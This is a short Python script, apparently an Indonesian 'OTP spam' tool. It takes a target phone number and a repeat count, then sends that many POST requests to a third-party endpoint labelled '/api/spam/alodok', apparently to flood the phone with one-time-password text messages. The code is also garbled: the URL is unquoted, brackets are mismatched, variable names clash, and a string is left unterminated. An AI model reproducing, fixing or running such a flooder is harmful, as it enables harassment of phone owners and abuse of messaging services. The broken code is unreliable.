import requests, time

print("""
         [KAR13MA09 OTP]
           -KAR13MA09-
""")

num=input("[In] Nomor: ")
jum=int(input("[In]Jumlah"))

print("\n[RESULT]")
for x in range(jum):
        try:
                 reg=requests.post(https://nuubi.herokuapp.com/api/spam/alodok)
                              data={"number":num})
                 if req.json()['status'] == 'ok':
                         print(f"{x+1}. Gagal {num})
        except Exception as e:
                print(f"{x+1}.pass: {e}")                        
                